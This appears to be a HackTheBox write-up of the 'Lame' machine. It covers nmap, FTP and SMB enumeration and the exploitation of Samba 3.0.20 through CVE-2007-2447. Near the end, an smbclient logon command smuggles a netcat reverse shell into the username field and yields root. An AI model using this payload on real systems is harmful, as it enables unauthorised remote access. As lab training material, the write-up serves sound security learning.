---
title: Lame
tags:
  - HackTheBox
  - Easy
  - Linux
  - Metasploit
---
## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.3 lame.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- lame.htb > sC.txt

[redacted]
PORT     STATE SERVICE
21/tcp   open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

As you can see above, anonymous login is enabled, so I tried it:

```shell
ftp anonymous@lame.htb
```

But I didn't find anything, so I decided to check the port 139 (related to SMB):

```shell
Password for [WORKGROUP\gitblanc]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

It also had anonymous login, and 3 disk are seen. First, I connected to `/tmp` and perform a `ls`:

```shell
smbclient  //lame.htb/tmp

[redacted]
smb: \> ls
  5569.jsvc_up                        R        0  Wed Oct 30 15:50:54 2024
  .ICE-unix                          DH        0  Wed Oct 30 15:49:51 2024
  vmware-root                        DR        0  Wed Oct 30 15:49:55 2024
  .X11-unix                          DH        0  Wed Oct 30 15:50:17 2024
  .X0-lock                           HR       11  Wed Oct 30 15:50:17 2024
  vgauthsvclog.txt.0                  R     1600  Wed Oct 30 15:49:50 2024
```

Then I downloaded `vgauthsvclog.txt.0`:

```shell
get vgauthsvclog.txt.0

[redacted]
[Oct 30 10:49:50.298] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Oct 30 10:49:50.298] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Oct 30 10:49:50.298] [ message] [VGAuthService] Group 'service'
[Oct 30 10:49:50.298] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Oct 30 10:49:50.298] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Oct 30 10:49:50.362] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Oct 30 10:49:50.362] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Oct 30 10:49:50.362] [ message] [VGAuthService] Group 'service'
[Oct 30 10:49:50.362] [ message] [VGAuthService]         samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Oct 30 10:49:50.362] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Oct 30 10:49:50.363] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Oct 30 10:49:50.364] [ message] [VGAuthService] INIT SERVICE
[Oct 30 10:49:50.364] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Oct 30 10:49:50.397] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Oct 30 10:49:50.435] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Oct 30 10:49:50.435] [ message] [VGAuthService] BEGIN SERVICE
```

Didn't give me anything interesting, so I decided to take a look at the Samba version previously found.

## Weaponization

I searched for "Samba 3.0.20 exploit" and found [CVE-2007-2447](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

```shell
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
    ...targets...
msf exploit(usermap_script) > set TARGET lame.htb
msf exploit(usermap_script) > show options
    ...show and set options...
msf exploit(usermap_script) > exploit
```

## Explotation

I had to read the exploit (*because it didn't work with the msfconsole*). This is basically the vulnerability:

![](Pasted%20image%2020241030162738.png)

This can be applied to the moment we establish a connection to bypass login (username parameter):

```shell
smbclient //lame.htb/tmp

[redacted]
smb: \> logon "/=`nohup nc -nv 10.10.14.13 666 -e /bin/sh`"
```

![](Pasted%20image%2020241030163018.png)

> We directly become root! 

Now we can see the user and root flag:

![](Pasted%20image%2020241030163137.png)

![](Pasted%20image%2020241030163222.png)

==Machine pwned!==